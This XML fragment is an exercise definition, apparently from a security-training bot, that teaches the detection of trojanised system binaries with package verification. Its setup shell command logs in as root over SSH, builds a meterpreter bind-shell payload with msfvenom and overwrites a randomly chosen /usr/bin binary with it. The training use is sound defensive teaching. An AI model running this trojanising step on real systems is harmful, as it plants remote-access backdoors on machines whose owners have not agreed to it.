	<!--trojanising a file in /usr/bin/, use package verification to detect which file changes-->
	<attack>
		<!-- topic: File integrity checkers-->
		<pre_shell>binname=$(ssh -i /opt/hackerbot/keys/id_rsa -oStrictHostKeyChecking=no root@{{chat_ip_address}} 'sel=$(cat /var/lib/dpkg/info/*.md5sums 2>/dev/null | sed "s#^[^ ]* *#/#" | grep -E "^/usr/bin/[^/]+$" | grep -vE "/(bash|dash|sh|mv|cp|sudo|su|ssh|scp|sftp)$" | sort -u); n=$(printf "%s\n" "$sel" | grep -c .); idx=$(( (<%= rand(1000000) %> % n) + 1 )); printf "%s\n" "$sel" | sed -n "${idx}p"'); echo "$binname|${binname#/usr}"; msfvenom --platform linux -p linux/x86/meterpreter/bind_tcp -f elf -o /tmp/msfout; scp -i /opt/hackerbot/keys/id_rsa -prv -oStrictHostKeyChecking=no /tmp/msfout root@{{chat_ip_address}}:$binname</pre_shell>
		<get_shell>false</get_shell>
    <suppress_command_output_feedback />

		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware. Use PACKAGE VERIFICATION to detect which file has changed</prompt>

		<condition>
			<output_matches>/bin/</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
